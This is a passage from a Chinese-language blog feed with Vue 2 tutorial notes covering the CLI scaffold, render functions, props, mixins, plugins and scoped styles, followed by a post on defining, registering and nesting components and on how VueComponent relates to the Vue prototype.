class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;!-- 以最高级别渲染vue项目 --&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;!-- 开启移动端的理想视口 --&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;!-- BASE_URL %便是public目录下 --&gt;</span><br><span class="line">    &lt;link rel=&quot;icon&quot; href=&quot;&lt;%= BASE_URL %&gt;favicon.ico&quot;&gt;</span><br><span class="line">    &lt;title&gt;&lt;%= htmlWebpackPlugin.options.title %&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;!-- 当浏览器不支持js时，&lt;noscript&gt;标签里面的内容就会显示 --&gt;</span><br><span class="line">    &lt;noscript&gt;sorry your web not support js&lt;/noscript&gt;</span><br><span class="line">    &lt;!-- 容器 --&gt;</span><br><span class="line">    &lt;div id=&quot;root&quot;&gt;</span><br><span class="line">        &lt;App&gt;&lt;/App&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;!-- 一定在模板之后加入文件引入 --&gt;</span><br><span class="line">    &lt;script src=&#x27;../../js/vue.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&#x27;main.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>几个<head>配置项需要注意，已经进行了注释</p><p><strong>还有就是一定要注意路径的有没有写错</strong></p><p>之后我们使用Ctrl和~键就可以在vscode中打开cmd，输入<code>npm run serve</code>就可以在8080端口打开我们的文件了</p><h2 id="三-render配置项"><a href="#三-render配置项" class="headerlink" title="三 . render配置项"></a>三 . render配置项</h2><p>在我们的脚手架中，new vue中注册App的时候我们加入的不是template还有components，而是使用了render配置项代替。那么这个render配置项的作用是什么呢？</p><p>我们首先使用原来的写法尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import Vue from &#x27;vue&#x27;//Question</span><br><span class="line">import App from &#x27;./App.vue&#x27;;</span><br><span class="line"></span><br><span class="line">Vue.config.productionTip=false</span><br><span class="line"></span><br><span class="line">new Vue(&#123;</span><br><span class="line">    el: &quot;#root&quot;,</span><br><span class="line">    //写入模板，在html文件中就可以不用再在div中加app了</span><br><span class="line">    // render: h =&gt; h(App),</span><br><span class="line">    template:`</span><br><span class="line">    &lt;div&gt;hello&lt;/div&gt;</span><br><span class="line">    `</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>得到的结果便是页面不显示，vue报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vue.runtime.esm.js?c320:619 [Vue warn]: You are using the runtime-only build of Vue where the template compiler is not available. Either pre-compile the templates into render functions, or use the compiler-included build.</span><br><span class="line"></span><br><span class="line">(found in &lt;Root&gt;)</span><br></pre></td></tr></table></figure><p>其中这个错误，便是问题的核心==》它说我们使用了runtime-only的vue==》所以我们的问题在于引入的vue上面</p><p>我们第一行引入的vue其实是vue.runtime.ems.js，也就是vue.js的化简版，正常的vue包含了核心和模板解析器，而我们引入的版本没有了模块解析器（通过这样减小文件体积），所以我们的template也就理所应当的失效了。</p><p>于是我们拥有了render()，而render()就像一个临时的模板解析器，为我们提供模板解析服务</p><p>render开始的写法是一个函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">render(creatElement)&#123;//接受参数是一个function</span><br><span class="line">return creatElement(&#x27;h1&#x27;,&#x27;hello&#x27;)//页面上显示为h1标题的hello</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>化简后变成了<code>render: h =&gt; h(App)</code></p><h2 id="四-默认配置"><a href="#四-默认配置" class="headerlink" title="四 . 默认配置"></a>四 . 默认配置</h2><p>有关脚手架的配置文件，我们可以使用<code>vue inspect &gt; output.js</code>下查看，得到一个output.js，里面可以<strong>查看配置文件</strong>，<strong>但不能真正实现修改</strong>，如果我们需要修改配置文件，就需要<code>vue.config.js</code>在里面添加配置项进行修改</p><p>比如我这里关掉vue脚手架的语法检查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">const &#123; defineConfig &#125; = require(&#x27;@vue/cli-service&#x27;)</span><br><span class="line">module.exports = defineConfig(&#123;</span><br><span class="line">  transpileDependencies: true</span><br><span class="line">&#125;)</span><br><span class="line">module.exports = defineConfig(&#123;</span><br><span class="line">  lintOnSave:false  //关闭语法检查</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="五-ref属性"><a href="#五-ref属性" class="headerlink" title="五 . ref属性"></a>五 . ref属性</h2><p>1.用来给元素或者子组件注册引用信息（id替代者）</p><p>2.应用在html元素上是获取真实的DOM元素，应用在组件上得到的是组件实例对象（vc）</p><p>3.使用方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 v-text=&quot;msg&quot; ref=&quot;title&quot;&gt;&lt;/h1&gt;</span><br><span class="line">&lt;button @click=&quot;showDom&quot;&gt;点我获取元素&lt;/button&gt;</span><br><span class="line">&lt;School ref=&quot;School&quot; /&gt;</span><br><span class="line">&lt;School id=&quot;School&quot; /&gt;</span><br></pre></td></tr></table></figure><p>添加在标签处添加ref属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">showDom()&#123;</span><br><span class="line">         console.log(this.$refs.title)//拿到的是真实的DOM</span><br><span class="line">         console.log(this.$refs.School)//拿到的是vc</span><br><span class="line">         console.log(document.getElementById(&#x27;School&#x27;))//获取的是School组件的template标签下的内容</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>通过this.$refs拿到元素</p><h2 id="六-props配置"><a href="#六-props配置" class="headerlink" title="六 . props配置"></a>六 . props配置</h2><p>这里补充一个小坑</p><p>在更新src中的文件时</p><p><img src="https://s2.loli.net/2022/03/28/B2q5UAZHbEivryK.png" alt="小坑.png"></p><p>可能会出现组件写了但是不显示的情况，这个情况是因为：1.我们没有在App中引入 2.我们没有在template标签里面加入 3.我们的name写错了。</p><p>下面我们讲props配置：让组件接收外部传进来的数据</p><p>我们在使用props之前，需要在对应的组件标签中加入我们需要的参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 必须写成字符串类型 写成其他类型(包括表达式)需要加冒号:--&gt;</span><br><span class="line"></span><br><span class="line">  &lt;Student name=&quot;张三&quot; :age=18 sex=&quot;男&quot;/&gt;</span><br></pre></td></tr></table></figure><p>这里有三种情况：1.传字符串如name，那么记得加” “</p><p>​                             2.传数字，那么像age，需要加：表示v-bind</p><p>​                             3.传表达式，如<code>:age=&quot;19+1&quot;</code>,代表传过去的是Number类型而且是20</p><p>而props的写法也有三种：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//   第一个props</span><br><span class="line">//   props: [&#x27;name&#x27;, &#x27;age&#x27;, &#x27;sex&#x27;]//props配置接参数</span><br><span class="line">//   第二个props 接收同时对数据进行限制，不符合类型控制台会提示</span><br><span class="line">// props:&#123;</span><br><span class="line">//     name:String,</span><br><span class="line">//     age:Number,</span><br><span class="line">//     sex:String</span><br><span class="line">// &#125;</span><br><span class="line">//   第三种props 拥有三个配置项</span><br><span class="line">// props:&#123;</span><br><span class="line">//     name:&#123;</span><br><span class="line">//     type:String,</span><br><span class="line">//     require:true//name是必要的</span><br><span class="line">//     &#125;,</span><br><span class="line">//     age:&#123;</span><br><span class="line">//         type:Number,</span><br><span class="line">//         default:99//不传默认99</span><br><span class="line">//     &#125;,</span><br><span class="line">//     sex:&#123;</span><br><span class="line">//         type:String,</span><br><span class="line">//         require:true//一般default和require不一起使用</span><br><span class="line">//     &#125;</span><br><span class="line">// &#125;</span><br></pre></td></tr></table></figure><p>这样我们就可以使用插值语法进行数据代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2&gt;学生姓名：&#123;&#123; name &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;学生年龄：&#123;&#123; age &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;学生性别：&#123;&#123; sex &#125;&#125;&lt;/h2&gt;</span><br></pre></td></tr></table></figure><p>并展示我们之前在标签中写入的信息了</p><h3 id="tips："><a href="#tips：" class="headerlink" title="tips："></a>tips：</h3><p>1.我们的整个配置叫props，但是我们在props中加入的数据是一个一个的prop</p><p>2.我们在props:[]中不要申明没有传入的数据，不然会赋值为undefined</p><p>3.props中的属性不能修改，如果直接修改，虽然页面会改变，但是控制台会报错</p><p>​    如果我们像修改props中的数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">data() &#123;</span><br><span class="line"></span><br><span class="line">  return &#123;</span><br><span class="line"></span><br><span class="line">   msg: &quot;我是一名学生&quot;,</span><br><span class="line"></span><br><span class="line">   myagg:this.age+1//由于vue先扫描props，所以可以使用this.age</span><br><span class="line"></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>通过在data中加入myagg与this.age 进行关联，我们就可以动态改变显示的值</p><h2 id="七-混合"><a href="#七-混合" class="headerlink" title="七. 混合"></a>七. 混合</h2><p>可以将多个组件共有的配置混合，更好的实现组件功能的复用</p><p>混合需要先建立一个mixin.js的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// 分别暴露</span><br><span class="line">export const mixin = &#123;</span><br><span class="line">    methods: &#123;</span><br><span class="line">        showname() &#123;</span><br><span class="line">            alert(this.name)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line">//混合数据</span><br><span class="line">export const mixin2 = &#123;</span><br><span class="line">    data()&#123;</span><br><span class="line">        return &#123;</span><br><span class="line">            x:100,</span><br><span class="line">            y:200</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    mounted() &#123;</span><br><span class="line">        console.log(&quot;hello!!!&quot;)</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件中加入需要复用的功能代码，赋值并暴露</p><p>然后在组件中加入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import &#123; mixin,mixin2 &#125; from &quot;../mixin&quot;;</span><br><span class="line">export default &#123;</span><br><span class="line">mixins: [mixin,mixin2],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>便完成了混合</p><p><strong>还有一种全局混合</strong></p><p>在main.js 中加入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import &#123; mixin,mixin2 &#125; from &quot;./mixin&quot;</span><br><span class="line"></span><br><span class="line">// 全局配置mixin</span><br><span class="line">Vue.mixin(mixin2)</span><br></pre></td></tr></table></figure><p>然后就可以直接使用mixin:[]使用我们的混合了</p><h3 id="tips：-1"><a href="#tips：-1" class="headerlink" title="tips："></a>tips：</h3><p>1.混合中的数据不会覆盖data和method中的数据</p><p>2.混合中的生命周期钩子会和原组件中的生命周期钩子共存，并一起发挥作用，而且是混合中的作用在前</p><h2 id="八-插件"><a href="#八-插件" class="headerlink" title="八 . 插件"></a>八 . 插件</h2><p>插件用于极大增强我们vue的功能</p><p>定义插件：我们创建一个plugins.js的文件用于我们的插件</p><p>​                  在这个里面我们通过全局定义一些过滤器，自定义指令，混入……</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import Vue from &quot;vue&quot;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">    // 获得参数是vue的构造函数</span><br><span class="line">    install(vue,x,y,z) &#123;</span><br><span class="line">        console.log(x,y,z);//接收use过来的参数</span><br><span class="line">        Vue.filter(&#x27;mySlice&#x27;, function (values) &#123;</span><br><span class="line">            return values.slice(0, 4)</span><br><span class="line">        &#125;)</span><br><span class="line">        //全局directive，注意没有s，与全局filter类似</span><br><span class="line">        Vue.directive(&#x27;fbind&#x27;,&#123;</span><br><span class="line">            bind(element,binding)&#123;</span><br><span class="line">                        //成功绑定时</span><br><span class="line">                        element.value=binding.value</span><br><span class="line">                    &#125;,</span><br><span class="line">                    inserted(element,binding)&#123;</span><br><span class="line">                        //所在元素插入时</span><br><span class="line">                        element.focus()//插入时获取焦点。是函数形无法实现的</span><br><span class="line">                    &#125;,</span><br><span class="line">                    update(element,binding)&#123;</span><br><span class="line">                        //模板重新解析时</span><br><span class="line">                        element.value=binding.value</span><br><span class="line">                        element.focus()</span><br><span class="line">                    &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        // 定义混入</span><br><span class="line">        Vue.mixin(&#123;</span><br><span class="line">            data() &#123;</span><br><span class="line">                return &#123;</span><br><span class="line">                    x: 100,</span><br><span class="line">                    y: 200</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>使用插件：</p><p>在main.js 中我们通过引入插件文件使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import plugins from &#x27;./plugins&#x27;</span><br><span class="line">Vue.use(plugins,1,2,3)</span><br></pre></td></tr></table></figure><p>特别注意这里的vue,1,2,3 是可以通过use向install传递的参数 而<strong>默认的第一个参数则是vue的构造方法，通过这个构造方法，我们可以在vc和vm中使用在plugins定义的方法</strong></p><h2 id="九-scoped"><a href="#九-scoped" class="headerlink" title="九 . scoped"></a>九 . scoped</h2><p>我们在编辑组件样式的时候，有可能出现样式名相同的情况，1号组件的样式是为.demo服务的，但是我2号组件也有一个.demo，于是便会出现冲突</p><p>于是我们在style后面加入一个scoped ==&gt;让样式在局部生效，不妨碍其他的样式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;style scoped&gt;</span><br><span class="line">/* 这里放置css样式 */</span><br><span class="line">.demo &#123;</span><br><span class="line">  background-color: orange;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p><strong>tips：</strong>App组件当中不要使用，因为App组件样式是为了全局服务</p>]]></content>
    
    
    
    <tags>
      
      <tag>脚手架</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vue组件</title>
    <link href="/2022/03/22/%E7%BB%84%E4%BB%B6/"/>
    <url>/2022/03/22/%E7%BB%84%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>为了提高编程的复用性和降低编程的冗杂度，我们创造了组件</p><span id="more"></span><h1 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h1><h3 id="Q："><a href="#Q：" class="headerlink" title="Q："></a>Q：</h3><p>1.什么是组件</p><p>​    组件是实现应用中局部功能的代码和资源的集合</p><p>2.组件的作用</p><p>​    组件的不冗杂，复用性高，而且可以嵌套</p><p>模块化就是简单的拆分，而组件化是将代码封装以实现功能点</p><h2 id="一-组件的引入"><a href="#一-组件的引入" class="headerlink" title="一 . 组件的引入"></a>一 . 组件的引入</h2><p>在Vue中使用组件包括三步 </p><ol><li>定义组件</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">const student = Vue.extend(&#123;</span><br><span class="line">            template: `</span><br><span class="line"></span><br><span class="line">            &lt;div&gt;</span><br><span class="line">            &lt;h2&gt;学生姓名：&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span><br><span class="line">            &lt;h2&gt;学生性别：&#123;&#123;sex&#125;&#125;&lt;/h2&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">​            `,//用template写html格式，注意需要有根标签</span><br><span class="line">​            data()&#123;</span><br><span class="line">​                return&#123;</span><br><span class="line">​                name:&#x27;张三&#x27;,</span><br><span class="line">​                sex:&#x27;male&#x27;</span><br><span class="line">​                &#125;</span><br><span class="line">​            &#125;//data写成函数形式</span><br><span class="line">​        &#125;)</span><br></pre></td></tr></table></figure><p>其中使用template配置项创建组件的html部分，data()部分写成函数形式，其他的监听器和计算属性等等都可以照写。<strong>注意data（要写return）</strong></p><p>2.注册组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">var vm = new Vue(&#123;</span><br><span class="line"></span><br><span class="line">​      el: &#x27;#app&#x27;,</span><br><span class="line"></span><br><span class="line">​      //注册组件</span><br><span class="line"></span><br><span class="line">​      components:&#123;</span><br><span class="line"></span><br><span class="line">​        school,//简写形式</span><br><span class="line"></span><br><span class="line">​        zhangsan:student</span><br><span class="line"></span><br><span class="line">​      &#125;</span><br><span class="line"></span><br><span class="line">​    &#125;);</span><br></pre></td></tr></table></figure><p>在vm当中注册组件，在components配置项中以 key : value形式注册组件，可以简写</p><p>还有一种全局注册形式</p><p><code>Vue.component(&#123;&#39;组件使用名&#39;,组件变量名&#125;)</code></p><p>3.使用组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&#x27;app&#x27;&gt;</span><br><span class="line">        &lt;!-- 标签形式引入组件 --&gt;</span><br><span class="line">        &lt;school&gt;&lt;/school&gt;</span><br><span class="line">       &lt;hr&gt; </span><br><span class="line">       &lt;zhangsan&gt;&lt;/zhangsan&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>在Vue所管理的元素下插入标签，叫做组件标签，便可以显示组件中的信息</p><p>在组件书写的时候需要注意的几个点：</p><p><img src="https://s2.loli.net/2022/03/28/JiFr73HIZNnRtCO.png" alt="组件书写注意事项.png"></p><p>1.name配置项可以修改组件在开发者工具中的名字，但其他地方的名字是不会改变的</p><p>2.简写形式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 简写形式</span><br><span class="line">        const student = &#123;</span><br><span class="line">            template: `</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">            &lt;h2&gt;学生姓名：&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span><br><span class="line">            &lt;h2&gt;学生性别：&#123;&#123;sex&#125;&#125;&lt;/h2&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            `,//用template写html格式，注意需要有根标签</span><br><span class="line">            data()&#123;</span><br><span class="line">                return&#123;</span><br><span class="line">                name:&#x27;张三&#x27;,</span><br><span class="line">                sex:&#x27;male&#x27;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;//data写成函数形式</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><strong>总结</strong></p><p><img src="https://s2.loli.net/2022/03/28/bRc2UiwLEYk7sPn.png" alt="非单文件组件总结1.png"></p><h2 id="二-组件的嵌套"><a href="#二-组件的嵌套" class="headerlink" title="二  . 组件的嵌套"></a>二  . 组件的嵌套</h2><p>因为组件中有data属性，所以也可以有components属性，用这个完成我们的套娃</p><p>我们在school中嵌套student属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">const school = Vue.extend(&#123;</span><br><span class="line">            template: `</span><br><span class="line"></span><br><span class="line">            &lt;div&gt;</span><br><span class="line">            &lt;h2&gt;学校名称：&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span><br><span class="line">            &lt;h2&gt;学校地址：&#123;&#123;address&#125;&#125;&lt;/h2&gt;</span><br><span class="line">            &lt;zhangsan&gt;&lt;/zhangsan&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">​            `,</span><br><span class="line">​            data() &#123;</span><br><span class="line">​                return &#123;</span><br><span class="line">​                    name: &#x27;swpu&#x27;,</span><br><span class="line">​                    address: &#x27;新都&#x27;</span><br><span class="line">​                &#125;</span><br><span class="line">​            &#125;,</span><br><span class="line">​            //嵌套components</span><br><span class="line">​            components: &#123;</span><br><span class="line">​                zhangsan: student</span><br><span class="line">​            &#125;</span><br><span class="line">​        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将student注册在school中,并在template配置下加入student所对应的标签</p><p>此外我们还可以设置一个更大的组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">const app = Vue.extend(&#123;</span><br><span class="line">           template: `</span><br><span class="line">           &lt;div&gt;</span><br><span class="line">           &lt;hello&gt;&lt;/hello&gt;</span><br><span class="line">           &lt;school&gt;&lt;/school&gt;</span><br><span class="line">           &lt;/div&gt; </span><br><span class="line">           `,</span><br><span class="line">           components:&#123;</span><br><span class="line">               school,</span><br><span class="line">               hello,</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;)</span><br><span class="line">       var vm = new Vue(&#123;</span><br><span class="line">           el: &#x27;#app&#x27;,</span><br><span class="line">           data: &#123;</span><br><span class="line">           &#125;,</span><br><span class="line">           components: &#123;</span><br><span class="line">               app</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br></pre></td></tr></table></figure><p>app组件用于定义一个全局的总组件,将其他的组件嵌套进入app，再在vm中注册app=》即可以使用一个<app>标签实现几个组件的功能了</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>组件书写需要有顺序，<strong>子组件需要先写，父组件后写</strong>，不然会出现未定义使用的情况</p><h2 id="三-VueCompoent"><a href="#三-VueCompoent" class="headerlink" title="三 . VueCompoent"></a>三 . VueCompoent</h2><p>当我们使用Vue.extend时，Vue会帮我们调用一个构造函数VueComponent()，这个构造函数是我们组件十分重要的知识点</p><p>我们看Vue.extend的源码</p><p><img src="https://s2.loli.net/2022/03/28/BVfb4sYkUadNoRh.png" alt="Vue.extend源码.png"></p><p>每次调用Vue.extend()，便会生成一个sub，sub是一个vuecomponent构造函数，这个sub在最后会被return。这说明了非常重要的一点：<strong>Vue.extend()每次调用都是生成的一个新的VueComponent</strong>，学过java的应该可以很好理解，即形成了<strong>统一构造函数下的不同实例对象</strong></p><p>其二，在Vue中我们使用this，指向的是vm，<strong>而在组件当中使用this，指向的便是VueComponent</strong>，简称vc，而在vc中 和vm一样，有自己的数据代理和数据检测</p><p><strong>但是vc是归vm管的，在vm管理的vc下也会有子vc</strong>,vm vc是非常相似的，但是vc中没有el，也就是说，vc交于vm再指定为哪一个el工作 </p><h2 id="四-一个重要的内置关系"><a href="#四-一个重要的内置关系" class="headerlink" title="四 . 一个重要的内置关系"></a>四 . 一个重要的内置关系</h2><p>关于Vue和VueComponent的原型对象</p><p><img src="https://s2.loli.net/2022/03/28/9ebiBQltNqsoIjH.png" alt="Vue与VueComponent的内置关系.png"></p><p>原型对象的关系有点类似于java中的继承，函数中找原型对象是prototype而实例对象中是<code>_ _proto_ _</code>,此时Vue干了这么一件事情，将VueComponent的原型对象的<code>_ _proto_ _</code>属性指向了Vue的原型对象</p><p>这样子做有什么效果呢？其实是起到了一个保底的效果，比如Vue原型对象中有一个x，改变了x的值，我们需要的是vc也收到这个改变，如果vc的原型对象指向的是其他地方，vc就无法和vm的原型对象产生一个关联。<strong>以后vc查找需要的东西时，就会在vue的原型对象上多查找一下</strong></p><h2 id="五-单文件组件"><a href="#五-单文件组件" class="headerlink" title="五 . 单文件组件"></a>五 . 